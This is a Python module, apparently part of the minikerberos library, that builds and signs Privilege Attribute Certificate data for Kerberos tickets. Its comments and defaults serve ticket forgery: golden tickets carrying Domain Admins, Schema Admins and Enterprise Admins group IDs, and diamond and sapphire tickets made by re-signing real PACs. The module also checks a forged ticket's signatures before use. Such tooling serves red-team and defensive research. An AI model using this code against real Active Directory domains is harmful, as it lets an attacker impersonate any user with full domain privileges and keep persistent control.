
# Building and re-signing of the MS-PAC blob that rides inside a Kerberos
# ticket's authorization-data. The structures themselves are the vendored
# impacket ones in minikerberos.protocol.external.pac; this module owns the
# layout (offsets, padding) and the two signatures.
#
# References:
#   [MS-PAC] Privilege Attribute Certificate Data Structure
#   https://learn.microsoft.com/openspecs/windows_protocols/ms-pac

from __future__ import annotations
import datetime
import struct
from typing import Dict, List, Tuple

from minikerberos.protocol.encryption import Enctype, Cksumtype, Key, make_checksum
from minikerberos.protocol.external.pac import (
	PACTYPE, PAC_INFO_BUFFER, PAC_SIGNATURE_DATA, PAC_CLIENT_INFO,
	PAC_ATTRIBUTE_INFO, PAC_REQUESTOR, UPN_DNS_INFO_FULL,
	KERB_VALIDATION_INFO, VALIDATION_INFO, KERB_SID_AND_ATTRIBUTES,
	PAC_LOGON_INFO, PAC_CLIENT_INFO_TYPE, PAC_SERVER_CHECKSUM,
	PAC_PRIVSVR_CHECKSUM, PAC_UPN_DNS_INFO, PAC_ATTRIBUTES_INFO,
	PAC_REQUESTOR_INFO, PAC_TICKET_CHECKSUM, PAC_FULL_PAC_CHECKSUM,
)
from minikerberos.protocol.external.nrpc import GROUP_MEMBERSHIP
from minikerberos.protocol.external.ndr import NULL


# Key usage for every PAC signature (KERB_NON_KERB_CKSUM_SALT).
PAC_CHECKSUM_KEY_USAGE = 17

# The signature profile that goes with the key the PAC is signed under.
_CKSUM_FOR_ENCTYPE = {
	Enctype.AES256: Cksumtype.SHA1_AES256,
	Enctype.AES128: Cksumtype.SHA1_AES128,
	Enctype.RC4: Cksumtype.HMAC_MD5,
	Enctype.RC4_MD4: Cksumtype.HMAC_MD5,
}

_CKSUM_SIZE = {
	Cksumtype.SHA1_AES256: 12,
	Cksumtype.SHA1_AES128: 12,
	Cksumtype.HMAC_MD5: 16,
}

# UserAccountControl bits ([MS-SAMR] 2.2.1.12) a forged account wants.
USER_NORMAL_ACCOUNT = 0x00000010
USER_DONT_EXPIRE_PASSWORD = 0x00000200

# SE_GROUP_* attributes ([MS-DTYP] 2.4.3) carried by every group membership.
SE_GROUP_MANDATORY = 0x00000001
SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002
SE_GROUP_ENABLED = 0x00000004
SE_GROUP_DEFAULT_ATTRIBUTES = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED

# The group RIDs mimikatz/impacket put in a golden ticket by default:
# Domain Users, Domain Admins, Group Policy Creator Owners, Schema Admins,
# Enterprise Admins.
DEFAULT_GOLDEN_GROUPS = [513, 512, 520, 518, 519]

# PAC_ATTRIBUTE_INFO flags ([MS-PAC] 2.14).
PAC_WAS_REQUESTED = 0x00000001
PAC_WAS_GIVEN_IMPLICITLY = 0x00000002


def checksum_type_for_key(key: Key) -> int:
	"""The PAC signature profile matching the key the PAC is signed with."""
	cksumtype = _CKSUM_FOR_ENCTYPE.get(key.enctype)
	if cksumtype is None:
		raise Exception('No PAC signature profile for enctype %s' % key.enctype)
	return cksumtype


def checksum_size(cksumtype: int) -> int:
	size = _CKSUM_SIZE.get(cksumtype)
	if size is None:
		raise Exception('Unknown PAC signature size for cksumtype %s' % cksumtype)
	return size


def sid_to_bytes(sid: str) -> bytes:
	"""A SID string to its flat (non-NDR) wire form, as PAC_REQUESTOR and
	UPN_DNS_INFO carry it."""
	if sid is None:
		raise Exception('SID is None')
	parts = sid.strip().split('-')
	if len(parts) < 3 or parts[0].upper() != 'S':
		raise Exception('Not a SID: %s' % sid)
	revision = int(parts[1])
	authority = int(parts[2], 16) if parts[2].lower().startswith('0x') else int(parts[2])
	subauths = [int(x) for x in parts[3:]]
	data = struct.pack('<BB', revision, len(subauths))
	data += struct.pack('>Q', authority)[2:]  # 6-byte big-endian authority
	for sub in subauths:
		data += struct.pack('<L', sub)
	return data


def sid_split_rid(sid: str) -> Tuple[str, int]:
	"""'S-1-5-21-x-y-z-1234' -> ('S-1-5-21-x-y-z', 1234)"""
	parts = sid.strip().rsplit('-', 1)
	if len(parts) != 2:
		raise Exception('Not a SID with a RID: %s' % sid)
	return parts[0], int(parts[1])


def dt_to_filetime(dt: datetime.datetime) -> int:
	"""A datetime to a Windows FILETIME (100ns ticks since 1601-01-01)."""
	if dt.tzinfo is None:
		dt = dt.replace(tzinfo=datetime.timezone.utc)
	epoch = datetime.datetime(1970, 1, 1, tzinfo=datetime.timezone.utc)
	return int((dt - epoch).total_seconds()) * 10000000 + 116444736000000000


def _set_filetime(field, dt: datetime.datetime):
	ft = dt_to_filetime(dt)
	field['dwLowDateTime'] = ft & 0xffffffff
	field['dwHighDateTime'] = ft >> 32


def _set_never(field):
	"""The [MS-PAC] 'never expires' FILETIME."""
	field['dwLowDateTime'] = 0xFFFFFFFF
	field['dwHighDateTime'] = 0x7FFFFFFF


def pad_length(data_length: int) -> int:
	"""Bytes of padding needed to 8-align a buffer of this length."""
	return ((data_length + 7) // 8 * 8) - data_length


def build_logon_info(
		username: str,
		domain: str,
		domain_sid: str,
		user_id: int = 500,
		primary_group_id: int = 513,
		groups: List[int] = None,
		extra_sids: List[str] = None,
		logon_time: datetime.datetime = None,
		logon_server: str = '',
		user_session_key: bytes = None) -> bytes:
	"""The PAC_LOGON_INFO buffer: who the forged ticket claims to be."""
	if groups is None:
		groups = list(DEFAULT_GOLDEN_GROUPS)
	if extra_sids is None:
		extra_sids = []
	if logon_time is None:
		logon_time = datetime.datetime.now(datetime.timezone.utc)

	kerbdata = KERB_VALIDATION_INFO()

	_set_filetime(kerbdata['LogonTime'], logon_time)
	_set_never(kerbdata['LogoffTime'])
	_set_never(kerbdata['KickOffTime'])
	_set_filetime(kerbdata['PasswordLastSet'], logon_time)
	kerbdata['PasswordCanChange']['dwLowDateTime'] = 0
	kerbdata['PasswordCanChange']['dwHighDateTime'] = 0
	_set_never(kerbdata['PasswordMustChange'])

	kerbdata['EffectiveName'] = username
	kerbdata['FullName'] = ''
	kerbdata['LogonScript'] = ''
	kerbdata['ProfilePath'] = ''
	kerbdata['HomeDirectory'] = ''
	kerbdata['HomeDirectoryDrive'] = ''
	kerbdata['LogonCount'] = 500
	kerbdata['BadPasswordCount'] = 0
	kerbdata['UserId'] = user_id

	# A ticket for the domain's own krbtgt-less well-known principals aside,
	# the primary group has to be in the group list for Windows to accept it.
	kerbdata['PrimaryGroupId'] = primary_group_id
	kerbdata['GroupCount'] = len(groups)
	for group_id in groups:
		member = GROUP_MEMBERSHIP()
		member['RelativeId'] = group_id
		member['Attributes'] = SE_GROUP_DEFAULT_ATTRIBUTES
		kerbdata['GroupIds'].append(member)

	kerbdata['UserFlags'] = 0
	kerbdata['UserSessionKey'] = user_session_key if user_session_key is not None else b'\x00' * 16
	kerbdata['LogonServer'] = logon_server
	kerbdata['LogonDomainName'] = domain.upper()
	kerbdata['LogonDomainId'].fromCanonical(domain_sid)
	kerbdata['LMKey'] = b'\x00' * 8
	kerbdata['UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
	kerbdata['SubAuthStatus'] = 0
	kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = 0
	kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0
	kerbdata['LastFailedILogon']['dwLowDateTime'] = 0
	kerbdata['LastFailedILogon']['dwHighDateTime'] = 0
	kerbdata['FailedILogonCount'] = 0
	kerbdata['Reserved3'] = 0

	kerbdata['SidCount'] = len(extra_sids)
	if len(extra_sids) == 0:
		kerbdata['ExtraSids'] = NULL
	else:
		kerbdata['UserFlags'] |= 0x20  # LOGON_EXTRA_SIDS
		for sid in extra_sids:
			sid_and_attributes = KERB_SID_AND_ATTRIBUTES()
			sid_and_attributes['Sid'].fromCanonical(sid)
			sid_and_attributes['Attributes'] = SE_GROUP_DEFAULT_ATTRIBUTES
			kerbdata['ExtraSids'].append(sid_and_attributes)

	kerbdata['ResourceGroupDomainSid'] = NULL
	kerbdata['ResourceGroupCount'] = 0
	kerbdata['ResourceGroupIds'] = NULL

	validation_info = VALIDATION_INFO()
	validation_info['Data'] = kerbdata
	return validation_info.getData() + validation_info.getDataReferents()


def build_client_info(username: str, authtime: datetime.datetime) -> bytes:
	"""The PAC_CLIENT_INFO buffer. Its ClientId must equal the ticket's
	authtime or Windows rejects the ticket."""
	client_info = PAC_CLIENT_INFO()
	client_info['ClientId'] = dt_to_filetime(authtime)
	client_info['Name'] = username.encode('utf-16-le')
	client_info['NameLength'] = len(client_info['Name'])
	return client_info.getData()


def build_upn_dns_info(username: str, domain: str, user_sid: str = None) -> bytes:
	"""The UPN_DNS_INFO buffer. With user_sid set, the extended form carrying
	the sAMAccountName and the user SID is emitted."""
	with_sam_and_sid = user_sid is not None
	upn_dns_info = UPN_DNS_INFO_FULL()

	header_pad = b'\x00' * pad_length(len(upn_dns_info))
	upn_data = ('%s@%s' % (username.lower(), domain.lower())).encode('utf-16-le')
	upn_dns_info['UpnLength'] = len(upn_data)
	upn_dns_info['UpnOffset'] = len(upn_dns_info) + len(header_pad)
	total_len = upn_dns_info['UpnOffset'] + upn_dns_info['UpnLength']
	pad = pad_length(total_len)
	upn_data += b'\x00' * pad

	dns_name = domain.upper().encode('utf-16-le')
	upn_dns_info['DnsDomainNameLength'] = len(dns_name)
	upn_dns_info['DnsDomainNameOffset'] = total_len + pad
	total_len = upn_dns_info['DnsDomainNameOffset'] + upn_dns_info['DnsDomainNameLength']
	pad = pad_length(total_len)
	dns_name += b'\x00' * pad

	if with_sam_and_sid is False:
		upn_dns_info['Flags'] = 0
		return upn_dns_info.getData() + header_pad + upn_data + dns_name

	upn_dns_info['Flags'] = 2  # S: SamName and Sid are present

	sam_name = username.encode('utf-16-le')
	upn_dns_info['SamNameLength'] = len(sam_name)
	upn_dns_info['SamNameOffset'] = total_len + pad
	total_len = upn_dns_info['SamNameOffset'] + upn_dns_info['SamNameLength']
	pad = pad_length(total_len)
	sam_name += b'\x00' * pad

	sid_data = sid_to_bytes(user_sid)
	upn_dns_info['SidLength'] = len(sid_data)
	upn_dns_info['SidOffset'] = total_len + pad
	total_len = upn_dns_info['SidOffset'] + upn_dns_info['SidLength']
	sid_data += b'\x00' * pad_length(total_len)

	return upn_dns_info.getData() + header_pad + upn_data + dns_name + sam_name + sid_data


def build_attributes_info(flags: int = PAC_WAS_REQUESTED) -> bytes:
	"""The PAC_ATTRIBUTES_INFO buffer (post-CVE-2021-42287 PACs)."""
	attributes = PAC_ATTRIBUTE_INFO()
	attributes['FlagsLength'] = 2
	attributes['Flags'] = flags
	return attributes.getData()


def build_requestor_info(user_sid: str) -> bytes:
	"""The PAC_REQUESTOR buffer (post-CVE-2021-42287 PACs)."""
	requestor = PAC_REQUESTOR()
	requestor['UserSid'] = sid_to_bytes(user_sid)
	return requestor.getData()


def build_signature_buffer(cksumtype: int) -> bytes:
	"""A PAC_SIGNATURE_DATA buffer with the signature left zeroed."""
	signature = PAC_SIGNATURE_DATA()
	signature['SignatureType'] = cksumtype
	signature['Signature'] = b'\x00' * checksum_size(cksumtype)
	return signature.getData()


def assemble_pac(buffers: Dict[int, bytes]) -> Tuple[bytes, Dict[int, int]]:
	"""Lay out the PAC buffers behind a PACTYPE header.

	Returns the serialized PAC and, per buffer type, the absolute offset its
	data starts at - the signature pass needs those to patch in place.
	"""
	buffer_count = len(buffers)
	offset = 8 + (16 * buffer_count)  # PACTYPE header + one PAC_INFO_BUFFER each
	if pad_length(offset) != 0:
		raise Exception('PAC header is not 8-aligned')

	info_buffers = b''
	data = b''
	offsets = {}
	for ultype, blob in buffers.items():
		info_buffer = PAC_INFO_BUFFER()
		info_buffer['ulType'] = ultype
		info_buffer['cbBufferSize'] = len(blob)
		info_buffer['Offset'] = offset
		info_buffers += info_buffer.getData()

		offsets[ultype] = offset
		padding = pad_length(len(blob))
		data += blob + (b'\x00' * padding)
		offset += len(blob) + padding

	pac = PACTYPE()
	pac['cBuffers'] = buffer_count
	pac['Version'] = 0
	pac['Buffers'] = info_buffers + data
	return pac.getData(), offsets


def parse_pac(blob: bytes) -> Dict[int, bytes]:
	"""Split a serialized PAC back into its buffers, keyed by ulType.

	Used when a real PAC is taken from a KDC-issued ticket and re-signed
	(diamond and sapphire tickets).
	"""
	pac = PACTYPE(blob)
	buffers = {}
	buffer_data = pac['Buffers']
	for i in range(pac['cBuffers']):
		info_buffer = PAC_INFO_BUFFER(buffer_data[i * 16:])
		start = info_buffer['Offset'] - 8
		buffers[info_buffer['ulType']] = buffer_data[start:start + info_buffer['cbBufferSize']]
	return buffers


def sign_pac(buffers: Dict[int, bytes], server_key: Key, kdc_key: Key) -> bytes:
	"""Assemble and sign a PAC.

	[MS-PAC] 2.8: the server signature covers the whole PAC with both
	signatures zeroed; the KDC signature covers the server signature's bytes
	alone. Any PAC_TICKET_CHECKSUM / PAC_FULL_PAC_CHECKSUM left over from a
	KDC-issued PAC is dropped - they are keyed to the original ticket and
	cannot be recomputed here.
	"""
	buffers = dict(buffers)
	buffers.pop(PAC_TICKET_CHECKSUM, None)
	buffers.pop(PAC_FULL_PAC_CHECKSUM, None)

	server_cksumtype = checksum_type_for_key(server_key)
	kdc_cksumtype = checksum_type_for_key(kdc_key)
	buffers[PAC_SERVER_CHECKSUM] = build_signature_buffer(server_cksumtype)
	buffers[PAC_PRIVSVR_CHECKSUM] = build_signature_buffer(kdc_cksumtype)

	blob, offsets = assemble_pac(buffers)

	# Both signature fields are zero in blob right now, which is what the
	# server signature is computed over.
	server_sig = make_checksum(server_cksumtype, server_key, PAC_CHECKSUM_KEY_USAGE, blob)
	server_sig_at = offsets[PAC_SERVER_CHECKSUM] + 4  # past SignatureType
	blob = blob[:server_sig_at] + server_sig + blob[server_sig_at + len(server_sig):]

	kdc_sig = make_checksum(kdc_cksumtype, kdc_key, PAC_CHECKSUM_KEY_USAGE, server_sig)
	kdc_sig_at = offsets[PAC_PRIVSVR_CHECKSUM] + 4
	blob = blob[:kdc_sig_at] + kdc_sig + blob[kdc_sig_at + len(kdc_sig):]

	return blob


def _signature_locations(blob: bytes) -> Dict[int, int]:
	"""Absolute offset of each signature buffer's data within a serialized PAC."""
	pac = PACTYPE(blob)
	locations = {}
	for i in range(pac['cBuffers']):
		info_buffer = PAC_INFO_BUFFER(pac['Buffers'][i * 16:])
		if info_buffer['ulType'] in (PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM):
			locations[info_buffer['ulType']] = info_buffer['Offset']
	return locations


def verify_pac(blob: bytes, server_key: Key, kdc_key: Key = None) -> bool:
	"""Verify both signatures of a serialized PAC in place, exactly over the
	bytes on the wire (padding included), the way a KDC does.

	Used by the tests, and useful to confirm a forged ticket before it is put
	on the wire.
	"""
	locations = _signature_locations(blob)
	if PAC_SERVER_CHECKSUM not in locations or PAC_PRIVSVR_CHECKSUM not in locations:
		return False

	buffers = parse_pac(blob)
	server_sig_data = PAC_SIGNATURE_DATA(buffers[PAC_SERVER_CHECKSUM])
	kdc_sig_data = PAC_SIGNATURE_DATA(buffers[PAC_PRIVSVR_CHECKSUM])
	server_sig = server_sig_data['Signature']
	kdc_sig = kdc_sig_data['Signature']

	# The server signature is computed over the whole PAC with both signature
	# fields zeroed - zero them in place so padding and layout are preserved.
	zeroed = bytearray(blob)
	srv_at = locations[PAC_SERVER_CHECKSUM] + 4
	for i in range(len(server_sig)):
		zeroed[srv_at + i] = 0
	kdc_at = locations[PAC_PRIVSVR_CHECKSUM] + 4
	for i in range(len(kdc_sig)):
		zeroed[kdc_at + i] = 0

	expected_server = make_checksum(
		server_sig_data['SignatureType'], server_key, PAC_CHECKSUM_KEY_USAGE, bytes(zeroed))
	if expected_server != server_sig:
		return False
	if kdc_key is None:
		return True
	expected_kdc = make_checksum(
		kdc_sig_data['SignatureType'], kdc_key, PAC_CHECKSUM_KEY_USAGE, server_sig)
	return expected_kdc == kdc_sig
